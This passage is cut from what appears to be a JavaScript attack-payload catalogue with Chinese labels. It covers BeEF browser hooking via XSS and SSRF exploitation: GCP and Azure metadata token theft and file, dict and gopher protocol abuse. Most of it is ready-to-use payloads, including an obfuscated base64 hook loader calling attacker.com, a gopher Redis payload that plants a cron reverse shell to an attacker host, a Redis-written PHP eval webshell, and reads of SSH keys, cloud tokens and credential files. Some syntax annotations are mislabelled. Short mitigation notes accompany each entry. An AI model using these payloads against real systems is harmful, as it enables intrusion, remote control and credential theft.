    name: 'BeEF框架利用',
    description: '使用BeEF框架进行XSS利用',
    category: 'XSS跨站脚本',
    subCategory: 'BeEF利用',
    tags: ['xss', 'beef', 'framework', 'exploitation'],
    prerequisites: ['存在XSS漏�', '部署BeEF服务器'],
    execution: [
      { 
        title: '1. 部署BeEF', 
        command: '# 安装BeEF\ngit clone https://github.com/beefproject/beef\ncd beef\nbundle install\n./beef\n\n# 默认运行在 http://localhost:3000\n# 默认用户名: beef\n# 默认密码: beef',
            syntaxBreakdown: [
              { part: '# 安装BeEF\ngit clone https://github.com/beefproject/beef\ncd beef\nbundle install', explanation: '攻击载荷', type: 'value' }
            ],
        description: '部署BeEF服务器', 
        platform: 'linux'
      },
      { 
        title: '2. 注入Hook脚本', 
        command: '<script src="http://attacker.com:3000/hook.js"></script>\n注入短版本:\n<script src="//attacker.com:3000/hook.js"></script>', 
        description: '注入BeEF Hook', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'hook.js', explanation: 'BeEF的Hook脚本' },
          { part: 'attacker.com:3000', explanation: 'BeEF服务器地址' }
        ]
      },
      { 
        title: '3. 常用命令', 
        command: '# BeEF控制台常用命令\n# 查看在线僵尸\nbeef> online_browsers\n\n# 执行命令\nbeef> run social_engineering fake_notification\n\n# 获取Cookie\nbeef> run browser get_cookies\n\n# 重定向页面\nbeef> run browser redirect https://evil.com',
            syntaxBreakdown: [
              { part: '# BeEF控制台常用命令\n# 查看在线僵尸\nbeef> online_browsers\n\n# 执行命令\nbeef> run social_engin', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'BeEF控制台命令', 
        platform: 'all'
      },
      { 
        title: '4. 模块利用', 
        command: '# 常用模块\n# 社会工程学\n- Fake Notification\n- Fake Flash Update\n- Pretty Theft\n\n# 浏览器攻击\n- Get Cookie\n- Redirect Browser\n- TabNabbing\n\n# 网络攻击\n- DNS Spoofing\n- Ping Sweep\n- Port Scanner',
            syntaxBreakdown: [
              { part: '# 常用模块\n# 社会工程学\n- Fake Notification\n- Fake Flash ', explanation: 'SQL表达式', type: 'value' },
              { part: 'Update', explanation: 'SQL关键字', type: 'keyword' },
              { part: '\n- Pretty Theft\n\n# 浏览器攻击\n- Get Cookie\n- Redirect Browser\n- TabNabbing\n\n# 网络攻击\n- DNS Spoofing\n- Ping Sweep\n- Port Scanner', explanation: 'SQL表达式', type: 'value' }
            ],
        description: 'BeEF模块列表', 
        },
      ],
    wafBypass: [
      { 
        title: '混淆Hook URL', 
        command: '<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: 'Base64混淆Hook注入', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'BeEF(Browser Exploitation Framework)是一个开源的浏览器利用框架，通过XSS注入hook.js脚本控制受害者浏览器，可执行内网扫描、键盘记录、社工攻击、漏洞利用等数百种后渗透操作。',
      vulnerability: 'BeEF利用一段JavaScript hook脚本(hook.js)建立与C2服务器的WebSocket长连接，将受害者浏览器变为僵尸节点。可执行的操作包括：获取浏览器信息、截屏、重定向、表单注入、内网端口扫描、ARP欺骗(WebRTC)等。',
      exploitation: '完�利用流程：\n1. 部署BeEF服务器\n2. 注入Hook脚本\n3. 受害者上线\n4. 使用模块进行攻击',
      mitigation: '防御措施：\n1. 严格的XSS防护\n2. 使用CSP限制外部脚本\n3. 监控异常网络连接\n4. 安全意识培训',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssrf-cloud-gcp',
    name: 'GCP元数据攻击',
    description: '利用SSRF攻击Google Cloud元数据服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'GCP元数据',
    tags: ['ssrf', 'gcp', 'cloud', 'metadata'],
    prerequisites: ['存在SSRF漏�', '目标运行在GCP环境'],
    execution: [
      { 
        title: '1. 访问元数据服务', 
        command: 'http://metadata.google.internal/computeMetadata/v1/\n需要添加Header:\nMetadata-Flavor: Google', 
        description: '访问GCP元数据端点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'metadata.google.internal', explanation: 'GCP元数据服务地址' },
          { part: 'computeMetadata/v1/', explanation: '计算引擎元数据API' },
          { part: 'Metadata-Flavor: Google', explanation: '必需的请求�' }
        ]
      },
      { 
        title: '2. 获取访问令牌', 
        command: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n返回OAuth访问令牌',
            syntaxBreakdown: [
              { part: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取服务�户令牌', 
        platform: 'all'
      },
      { 
        title: '3. 获取服务�户信息', 
        command: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases',
            syntaxBreakdown: [
              { part: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取服务�户邮箱和别名', 
        platform: 'all'
      },
      { 
        title: '4. 获取项目信息', 
        command: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://metadata.google.internal/computeMetadata/v1/project/numeric-project-id',
            syntaxBreakdown: [
              { part: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://me', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取项目ID', 
        platform: 'all'
      },
      { 
        title: '5. 获取SSH密钥', 
        command: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys\nhttp://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys',
            syntaxBreakdown: [
              { part: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys\n', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取SSH公钥', 
        platform: 'all'
      },
      { 
        title: '6. 获取Kubelet凭据', 
        command: 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env\n获取Kubernetes环境变量',
        description: '获取GKE集群信息', 
        },
      ],
    wafBypass: [
      { 
        title: '使用IP地址', 
        command: 'http://169.254.169.254/computeMetadata/v1/\n使用内网IP代替域名',
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/computeMetadata/v1/\n使用内网IP代替域名', explanation: '攻击载荷', type: 'value' }
            ],
        description: '绕过域名过滤', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'GCP(Google Cloud Platform)环境中的SSRF可访问元数据服务(metadata.google.internal)获取服务账号的OAuth Token和项目配置信息，进而控制GCP资源(存储桶/数据库/计算实例等)。',
      vulnerability: 'GCP元数据服务要求Metadata-Flavor: Google头(但某些SSRF场景可注入自定义头)。关键端点包括：/computeMetadata/v1/instance/service-accounts/default/token获取Access Token、/project/project-id获取项目信息。',
      exploitation: '完�利用流程：\n1. 发现SSRF漏�\n2. 访问元数据服务\n3. 获取访问令牌\n4. 使用令牌访问GCP资源',
      mitigation: '防御措施：\n1. 限制元数据服务访问\n2. 使用GCP Instance Metadata API v2\n3. 实施网络隔离\n4. 监控异常元数据访问',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-cloud-azure',
    name: 'Azure元数据攻击',
    description: '利用SSRF攻击Azure元数据服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'Azure元数据',
    tags: ['ssrf', 'azure', 'cloud', 'metadata'],
    prerequisites: ['存在SSRF漏�', '目标运行在Azure环境'],
    execution: [
      { 
        title: '1. 访问元数据服务', 
        command: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01\n需要添加Header:\nMetadata: true', 
        description: '访问Azure元数据端点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '169.254.169.254', explanation: 'Azure元数据服务IP' },
          { part: '/metadata/instance', explanation: '实例元数据端点' },
          { part: 'Metadata: true', explanation: '必需的请求�' }
        ]
      },
      { 
        title: '2. 获取访问令牌', 
        command: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n返回Azure AD访问令牌',
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n返回Azure', explanation: '命令/载荷起始', type: 'command' },
              { part: ' AD访问令牌', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '获取托管身份令牌', 
        platform: 'all'
      },
      { 
        title: '3. 获取计算信息', 
        command: 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\n返回VM详细信息',
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\n返回VM详细信', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取计算实例信息', 
        platform: 'all'
      },
      { 
        title: '4. 获取网络信息', 
        command: 'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n返回网络配置信息',
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n返回网络配置信', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取网络配置', 
        platform: 'all'
      },
      { 
        title: '5. 获取用户数据', 
        command: 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text\n返回用户自定义数据',
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01', explanation: '攻击载荷', type: 'value' }
            ],
        description: '获取用户数据', 
        },
      ],
    wafBypass: [
      { 
        title: '绕过Metadata�检查', 
        command: '使用HTTP请求走私或重定向绕过Metadata�检查',
            syntaxBreakdown: [
              { part: '使用HTTP请求走私或重定向绕过Metadata�检查', explanation: '攻击载荷', type: 'value' }
            ],
        description: '绕过请求�验证', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Azure云环境中的SSRF可访问IMDS(Instance Metadata Service, 169.254.169.254)获取管理身份的OAuth Token，进而访问Azure Key Vault密钥、存储账户、SQL数据库等云资源。',
      vulnerability: 'Azure IMDS端点需要Metadata: true头。关键路径：/metadata/instance获取VM配置、/metadata/identity/oauth2/token获取Managed Identity的Access Token。该Token可用于调用Azure Resource Manager API管理所有授权资源。',
      exploitation: '完�利用流程：\n1. 发现SSRF漏�\n2. 添加Metadata�访问元数据\n3. 获取托管身份令牌\n4. 使用令牌访问Azure资源',
      mitigation: '防御措施：\n1. 禁用托管身份（如不需要）\n2. 实施网络隔离\n3. 监控异常元数据访问\n4. 使用Azure防火墙规则',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-protocol',
    name: 'SSRF协议利用',
    description: '利用各种协议进行SSRF攻击',
    category: 'SSRF服务端请求伪造',
    subCategory: '协议利用',
    tags: ['ssrf', 'protocol', 'file', 'gopher'],
    prerequisites: ['存在SSRF漏�', '服务器支持多种协议'],
    execution: [
      { 
        title: '1. File协议', 
        command: 'file:///etc/passwd\nfile:///c:/windows/win.ini\nfile:///proc/self/environ\n读取本地文件', 
        description: '使用File协议读取文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'file://', explanation: '本地文件协议' },
          { part: '/etc/passwd', explanation: 'Linux用户信息文件' },
          { part: '/proc/self/environ', explanation: '当前进程环境变量' }
        ]
      },
      { 
        title: '2. Dict协议', 
        command: 'dict://127.0.0.1:6379/info\ndict://127.0.0.1:11211/stats\n探测内网服务', 
        description: '使用Dict协议探测服务', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'dict://', explanation: '字典服务协议' },
          { part: '6379', explanation: 'Redis默认端口' },
          { part: '11211', explanation: 'Memcached默认端口' }
        ]
      },
      { 
        title: '3. Gopher协议', 
        command: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...\n构造Redis命令', 
        description: '使用Gopher协议攻击内网服务', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'gopher://', explanation: 'Gopher协议' },
          { part: '_', explanation: '协议分隔符' },
          { part: '%0d%0a', explanation: 'CRLF换行符URL编码' }
        ]
      },
      { 
        title: '4. LDAP协议', 
        command: 'ldap://attacker.com/cn=test\nldap://127.0.0.1:389/cn=test\n触发LDAP查询',
            syntaxBreakdown: [
              { part: 'ldap://attacker.com/cn=test\nldap://127.0.0.1:389/cn=test\n触发LDAP查询', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用LDAP协议', 
        platform: 'all'
      },
      { 
        title: '5. TFTP协议', 
        command: 'tftp://attacker.com/file\n触发TFTP请求',
            syntaxBreakdown: [
              { part: 'tftp://attacker.com/file\n触发TFTP请求', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用TFTP协议', 
        },
      ],
    wafBypass: [
      { 
        title: '协议大小写绕过', 
        command: 'FILE:///etc/passwd\nFile:///etc/passwd\nGopher://127.0.0.1:6379/',
            syntaxBreakdown: [
              { part: 'FILE:///etc/passwd\nFile:///etc/passwd\nGopher://127.0.0.1:6379/', explanation: '攻击载荷', type: 'value' }
            ],
        description: '大小写混合绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SSRF协议利用扩展了攻击面，除常见的http/https外，file://读取本地文件、gopher://构造任意TCP报文、dict://探测服务、ftp://访问FTP服务等协议极大增强了SSRF的利用能力。',
      vulnerability: 'SSRF支持的危险协议：file://读取本地文件(file:///etc/passwd)、gopher://构造任意TCP数据包(可攻击Redis/MySQL/SMTP等内网服务)、dict://探测端口和服务指纹、ftp://访问内网FTP、ldap://查询目录服务。',
      exploitation: '完�利用流程：\n1. 测试支持的协议\n2. 选择合适的协议\n3. 构造攻击payload\n4. 获取数据或执行命令',
      mitigation: '防御措施：\n1. 白名单限制协议（仅HTTP/HTTPS）\n2. 禁用危险协议处理\n3. URL规范化验证\n4. 网络隔离',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-gopher',
    name: 'Gopher协议攻击',
    description: '利用Gopher协议攻击内网服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'Gopher攻击',
    tags: ['ssrf', 'gopher', 'redis', 'mysql'],
    prerequisites: ['存在SSRF漏�', '服务器支持Gopher协议'],
    execution: [
      { 
        title: '1. Gopher基础格式', 
        command: 'gopher://<host>:<port>/_<payload>\n_后面是实际发送的数据\n需要URL编码', 
        description: 'Gopher协议格式', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'gopher://', explanation: 'Gopher协议标识' },
          { part: '<host>:<port>', explanation: '目标主机和端口' },
          { part: '_<payload>', explanation: '要发送的数据' }
        ]
      },
      { 
        title: '2. 攻击Redis', 
        command: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
            syntaxBreakdown: [
              { part: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a', explanation: '攻击载荷', type: 'value' }
            ],
        description: '写入cron任务反弹Shell', 
        platform: 'all'
      },
      { 
        title: '3. 攻击MySQL', 
        command: 'gopher://127.0.0.1:3306/_<MySQL协议数据包>\n需要构造MySQL协议格式的数据',
            syntaxBreakdown: [
              { part: 'gopher://127.0.0.1:3306/_<MySQL协议数据包>\n需要构造MySQL协议格式的数据', explanation: '攻击载荷', type: 'value' }
            ],
        description: '攻击MySQL数据库', 
        platform: 'all'
      },
      { 
        title: '4. 攻击FastCGI', 
        command: 'gopher://127.0.0.1:9000/_<FastCGI数据包>\n构造PHP-FPM攻击载荷',
            syntaxBreakdown: [
              { part: 'gopher://127.0.0.1:9000/_<FastCGI数据包>\n构造PHP-FPM攻击载荷', explanation: '攻击载荷', type: 'value' }
            ],
        description: '攻击PHP-FPM', 
        platform: 'all'
      },
      { 
        title: '5. 发送HTTP请求', 
        command: 'gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a\n构造HTTP请求攻击内网',
            syntaxBreakdown: [
              { part: 'gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d', explanation: '攻击载荷', type: 'value' }
            ],
        description: '发送HTTP请求', 
        },
      ],
    wafBypass: [
      { 
        title: '双重URL编码', 
        command: 'gopher://127.0.0.1:6379/_%252a%250d%250a...\n双重编码绕过',
            syntaxBreakdown: [
              { part: 'gopher://127.0.0.1:6379/_%252a%250d%250a...\n双重编码绕过', explanation: '攻击载荷', type: 'value' }
            ],
        description: '双重URL编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'gopher://协议是SSRF利用中最强大的协议，可构造任意TCP报文内容，能模拟Redis/MySQL/SMTP/HTTP等多种协议的通信，是SSRF攻击内网服务实现RCE的关键技术。',
      vulnerability: 'gopher://通过URL编码传递原始TCP数据：gopher://ip:port/_[url-encoded-data]。可构造Redis的SLAVEOF/CONFIG SET命令写webshell、MySQL认证包执行SQL语句、SMTP邮件发送、HTTP POST请求等，将SSRF升级为内网服务的任意操作。',
      exploitation: '完�利用流程：\n1. 确认Gopher协议支持\n2. 构造目标服务协议数据\n3. URL编码payload\n4. 发送攻击请求',
      mitigation: '防御措施：\n1. 禁用Gopher协议\n2. 白名单限制协议\n3. 网络隔离\n4. 监控异常请求',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssrf-dict',
    name: 'Dict协议攻击',
    description: '利用Dict协议探测和攻击内网服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'Dict协议',
    tags: ['ssrf', 'dict', 'redis', 'memcached'],
    prerequisites: ['存在SSRF漏�', '服务器支持Dict协议'],
    execution: [
      { 
        title: '1. Dict协议格式', 
        command: 'dict://<host>:<port>/<command>\n发送命令到目标服务', 
        description: 'Dict协议基础格式', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'dict://', explanation: 'Dict协议标识' },
          { part: '<host>:<port>', explanation: '目标主机和端口' },
          { part: '<command>', explanation: '要执行的命令' }
        ]
      },
      { 
        title: '2. 探测Redis', 
        command: 'dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*\n获取Redis信息',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*\n获取Redis信息', explanation: '攻击载荷', type: 'value' }
            ],
        description: '探测Redis服务', 
        platform: 'all'
      },
      { 
        title: '3. 探测Memcached', 
        command: 'dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key\n获取Memcached信息',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key\n获取Memcached信息', explanation: '攻击载荷', type: 'value' }
            ],
        description: '探测Memcached服务', 
        platform: 'all'
      },
      { 
        title: '4. Redis写入文件', 
        command: 'dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/set%20shell%20"<?php', explanation: '命令/载荷起始', type: 'command' },
              { part: ' @eval($_POST[cmd]);?>"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '写入WebShell', 
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: 'dict://127.0.0.1:6379/%73%65%74%20...\nURL编码命令',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/%73%65%74%20...\nURL编码命令', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'URL编码绕过关键字过滤', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'dict://协议可向指定IP:端口发送单行文本，常用于SSRF中的端口扫描和服务指纹识别。虽然功能有限，但在gopher://不可用时是内网探测的有效替代方案。',
      vulnerability: 'dict://协议向目标发送DICT协议命令(单行文本+CRLF)。利用方式：1)端口扫描(dict://ip:port/info检测端口开放) 2)Redis命令执行(dict://ip:6379/SET key value) 3)服务指纹(根据响应判断服务类型)。',
      exploitation: '完�利用流程：\n1. 确认Dict协议支持\n2. 探测内网服务\n3. 发送恶意命令\n4. 获取数据或写入文件',
      mitigation: '防御措施：\n1. 禁用Dict协议\n2. 白名单限制协议\n3. 内网服务认证\n4. 网络隔离',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-file',
    name: 'File协议攻击',
    description: '利用File协议读取本地文件',
    category: 'SSRF服务端请求伪造',
    subCategory: 'File协议',
    tags: ['ssrf', 'file', 'lfi', 'read'],
    prerequisites: ['存在SSRF漏�', '服务器支持File协议'],
    execution: [
      { 
        title: '1. Linux敏感文件', 
        command: 'file:///etc/passwd\nfile:///etc/shadow\nfile:///etc/hosts\nfile:///etc/resolv.conf\nfile:///proc/self/environ\nfile:///proc/self/cmdline', 
        description: '读取Linux敏感文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'file://', explanation: 'File协议标识' },
          { part: '/etc/passwd', explanation: '用户信息文件' },
          { part: '/proc/self/', explanation: '当前进程信息目录' }
        ]
      },
      { 
        title: '2. Windows敏感文件', 
        command: 'file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa\nfile:///c:/inetpub/logs/logfiles/',
            syntaxBreakdown: [
              { part: 'file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/u', explanation: '攻击载荷', type: 'value' }
            ],
        description: '读取Windows敏感文件', 
        platform: 'windows'
      },
      { 
        title: '3. Web配置文件', 
        command: 'file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app/config/database.yml\nfile:///app/.env',
            syntaxBreakdown: [
              { part: 'file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app', explanation: '攻击载荷', type: 'value' }
            ],
        description: '读取Web应用配置', 
        platform: 'all'
      },
      { 
        title: '4. 云环境文件', 
        command: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nfile:///home/user/.aws/credentials',
            syntaxBreakdown: [
              { part: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secr', explanation: '攻击载荷', type: 'value' }
            ],
        description: '读取云环境凭据', 
        platform: 'all'
      },
      { 
        title: '5. SSH密钥', 
        command: 'file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///root/.ssh/id_rsa',
            syntaxBreakdown: [
              { part: 'file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///r', explanation: '攻击载荷', type: 'value' }
            ],
        description: '读取SSH私钥', 
        },
      ],
    wafBypass: [
      { 
        title: '大小写混合', 
        command: 'FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD',
            syntaxBreakdown: [
              { part: 'FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD', explanation: '攻击载荷', type: 'value' }
            ],
        description: '大小写混合绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'file://协议是SSRF中最基础的利用方式，可直接读取服务器本地文件系统上的任意文件。虽然简单，但在获取配置文件、源代码、密钥文件等敏感信息时极为有效。',
      vulnerability: 'file://协议读取本地文件：file:///etc/passwd(用户列表)、file:///etc/shadow(密码哈希,需root权限)、file:///proc/self/environ(环境变量,可能包含密钥)、file:///root/.ssh/id_rsa(SSH私钥)。Windows下可读C:\Windows\win.ini等。',
      exploitation: '完�利用流程：\n1. 确认File协议支持\n2. 探测敏感文件路径\n3. 读取配置文件获取凭据\n4. 利用凭据进一步渗透',
      mitigation: '防御措施：\n1. 禁用File协议\n2. 白名单限制协议\n3. 文件权限控制\n4. 敏感文件加密存储',
      difficulty: 'beginner'
    }
  },
  {
    id: 'ssrf-bypass',
    name: 'SSRF绕过技术',
    description: '各种绕过SSRF过滤的技术',
    category: 'SSRF服务端请求伪造',
    subCategory: '绕过技术',
    tags: ['ssrf', 'bypass', 'waf', 'filter'],
    prerequisites: ['存在SSRF漏�', '存在过滤机制'],
    execution: [
      { 
        title: '1. IP格式绕过', 
        command: 'http://0177.0.0.1 (八进制)\nhttp://2130706433 (十进制)\nhttp://0x7f000001 (十六进制)\nhttp://127.1 (简写)\nhttp://127.0.0.1.nip.io (DNS重绑定)\nhttp://127.0.0.1.xip.io', 
        description: '使用不同IP格式表示127.0.0.1', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '0177', explanation: '127的八进制表示' },
          { part: '2130706433', explanation: '127.0.0.1的十进制�数' },
          { part: '0x7f000001', explanation: '127.0.0.1的十六进制' }
        ]
      },
      { 
        title: '2. URL解析差异', 
        command: 'http://attacker.com#@127.0.0.1/\nhttp://127.0.0.1.attacker.com\nhttp://attacker.com\\@127.0.0.1/\nhttp://attacker.com\\.127.0.0.1/', 
        description: '利用URL解析差异', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#@', explanation: '利用片段标识符差异' },
          { part: '\\@', explanation: '利用反斜杠解析差异' }
        ]
      },
      { 
        title: '3. 重定向绕过', 
        command: 'http://attacker.com/redirect?url=http://127.0.0.1\n使用短链接服务重定向到内网',
            syntaxBreakdown: [
              { part: 'http://attacker.com/redirect?url=http://127.0.0.1\n使用短链接服务重定向到内网', explanation: '攻击载荷', type: 'value' }
            ],
        description: '利用HTTP重定向', 
        platform: 'all'
      },
      { 
        title: '4. DNS重绑定', 
        command: 'http://7f000001.cip.cc\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP',
            syntaxBreakdown: [
              { part: 'http://7f000001.cip.cc\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'DNS重绑定攻击', 
        platform: 'all'
      },
      { 
        title: '5. IPv6绕过', 
        command: 'http://[::1]\nhttp://[0:0:0:0:0:0:0:1]\nhttp://[0000::1]\n使用IPv6本地地址',
            syntaxBreakdown: [
              { part: 'http://[::1]\nhttp://[0:0:0:0:0:0:0:1]\nhttp://[0000::1]\n使用IPv6本地地址', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用IPv6地址绕过', 
        platform: 'all'
      },
      { 
        title: '6. 编码绕过', 
        command: 'http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)\nhttp://127.0.0.1%00attacker.com (空字节)\nhttp://127.0.0.1%0d%0aHost:attacker.com (CRLF)',
            syntaxBreakdown: [
              { part: 'http://%31%32%37%2e%30%2e%30%2e%31', explanation: '命令/载荷起始', type: 'command' },
              { part: ' (URL编码)\nhttp://127.0.0.1%00attacker.com (空字节)\nhttp://127.0.0.1%0d%0aHost:attacker.com (CRLF)', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用编码绕过', 
        },
      ],
    wafBypass: [
      { 
        title: '组合绕过', 
        command: 'http://0x7f.0.0.1\nhttp://0177.0.0.1\nhttp://127.000.000.001\n多种格式组合',
            syntaxBreakdown: [
              { part: 'http://0x7f.0.0.1\nhttp://0177.0.0.1\nhttp://127.000.000.001\n多种格式组合', explanation: '攻击载荷', type: 'value' }
            ],
        description: '组合多种绕过技术', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SSRF绕过技术针对应用层面的URL过滤措施(IP黑名单/白名单/域名限制)，通过IP编码变换、DNS重绑定、URL解析差异、重定向跳转等方式突破SSRF防护。',
      vulnerability: 'SSRF过滤绕过方法：1)IP变形(0177.0.0.1/2130706433/0x7f000001) 2)IPv6(::1/::ffff:127.0.0.1) 3)DNS重绑定(域名解析切换) 4)URL解析差异(@符号/URL编码) 5)302重定向跳转 6)URL短链服务 7)进制转换 8)CNAME到内网IP。',
      exploitation: '完�利用流程：\n1. 分析过滤规则\n2. 测试各种绕过技术\n3. 找到有效的绕过方法\n4. 访问内网资源',
      mitigation: '防御措施：\n1. 解析后验证IP地址\n2. 禁止访问内网IP段\n3. 禁用重定向跟随\n4. 使用DNS解析验证',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-dns-rebinding',
    name: 'DNS重绑定攻击',
    description: '利用DNS重绑定绕过SSRF防护',
    category: 'SSRF服务端请求伪造',
    subCategory: 'DNS重绑定',
    tags: ['ssrf', 'dns', 'rebinding', 'bypass'],
    prerequisites: ['存在SSRF漏�', '存在DNS解析验证'],
    execution: [
      { 
        title: '1. DNS重绑定原理', 
